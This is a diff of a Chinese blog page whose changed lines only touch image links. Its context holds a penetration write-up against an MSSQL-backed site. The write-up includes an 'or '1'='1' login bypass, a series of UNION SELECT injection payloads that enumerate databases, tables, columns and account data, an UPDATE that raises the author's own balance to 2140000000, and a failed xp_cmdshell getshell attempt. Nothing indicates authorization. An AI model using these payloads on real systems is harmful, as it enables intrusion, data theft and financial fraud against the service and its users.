@@ -73,18 +73,18 @@ function activateLightMode(){
 <li>用什么nmap,awvs,vooli,ibm一堆工具搞了一遍发现没啥有用的信息</li>
 <li>然后直接打开网站只有一个后台，这样只能看下能不能后台注入</li>
 </ul>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/01.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/01.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/01.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 <p>如上图显示是有注入点的试下'or '1'='1'--直接进去了</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/02.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/02.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/02.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 <p>结果发现后台啥功能都没有就几张图</p>
 <p>然后转去搞APP去了，发现APP都是些泄露账户密码什么的没啥好玩的</p>
 <h3>振奋人心的发现</h3>
 <p>在Fiddler中抓到了一些奇怪的JS文件打开一看好多网址，都是我用IBM没扫描出来的东西，在一堆网址中找到了一个网页可以使用</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/03.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/03.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/03.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 <p>用老方法测试发现存在注入点如图</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/04.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/04.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/04.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 <p>我们用order by 猜字段得出有12个字段</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/05.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/05.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/05.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 <p>接着构造语句查询数据库版本数据库权限等信息</p>
 <p>'union select null,null,null,null,@@version,null,null,null,null,null,null,null --   查询数据库版本</p>
 <p>'union select null,null,null,null,system_user,null,null,null,null,null,null,null --   用户权限</p>
@@ -95,12 +95,12 @@ function activateLightMode(){
 <p>host_name() WIN-RG8BCEM932D</p>
 <h3>查询当前所有的数据库</h3>
 <p>111'union select null,null,null,null,name,null,null,null,null,null,null,null from master..sysdatabases--</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/06.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/06.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/06.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 <h3>查询当前数据库中的全部表(部分表截图)</h3>
 <p>'union select null,null,null,null,name,null,null,null,null,null,null,null from sysobjects where xtype='U' and category=0 -- </p>
 <h3>查询表中是否有数据(查询行)</h3>
 <p>'union select null,null,null,null,count(1),null,null,null,null,null,null,null from Server_IN_UserRecharge--</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E5%88%A4%E6%96%AD%E8%A1%A8%E4%B8%AD%E6%9C%89%E6%97%A0%E6%95%B0%E6%8D%AE.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E5%88%A4%E6%96%AD%E8%A1%A8%E4%B8%AD%E6%9C%89%E6%97%A0%E6%95%B0%E6%8D%AE.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E5%88%A4%E6%96%AD%E8%A1%A8%E4%B8%AD%E6%9C%89%E6%97%A0%E6%95%B0%E6%8D%AE.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 <h3>表+表中的行</h3>
 <p>c13b</p>
 <p>Server_AccountTradeRecord   39309</p>
@@ -153,17 +153,17 @@ function activateLightMode(){
 <p>后面一个表一个表猜去哪里有金额数据，最后在Server_UserAccount 这个表中找到了金额</p>
 <h3>查询表中的全部列名</h3>
 <p>'union select null,null,null,null,name,null,null,null,null,null,null,null FROM SysColumns Where id=Object_Id('Server_UserAccount')--  </p> 
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/07.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/07.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/07.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 <h3>查询表中列的数据</h3>
 <p>11111'union select null,null,Amount,User_id,2,3,null,4,null,null,null,null FROM Server_UserAccount-- </p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/08.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/08.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/08.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 <h3>修改金额</h3>
 <p>找到自己的用户ID这个我是在APP的返回包中抓到的</p>
 <p>Update 表名 set 字段=值 where 条件</p>
 <p>Update Server_UserAccount  set Amount=2140000000 where User_id=5317--</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/09.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/09.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E4%B9%8B%E5%89%8D.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E4%B9%8B%E5%89%8D.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E5%90%8E.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E5%90%8E.png?raw=true" src="/img/loading.gif" class="lazyload"></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/09.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E4%B9%8B%E5%89%8D.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption class="fancybox"><img alt data-src="https://github.com/Ascotbe/Random-img/blob/master/MSSQL_Penetration_Testing_Process/%E4%BF%AE%E6%94%B9%E5%90%8E.png?raw=true" src="/img/loading.gif" class="lazyload" title></a> </p>
 
 <h3>尝试getshell</h3>
 <p>改网站站库分离+没有上传点+不知道是装了360还是配置错误尽然用xp_cmdshell错误</p>
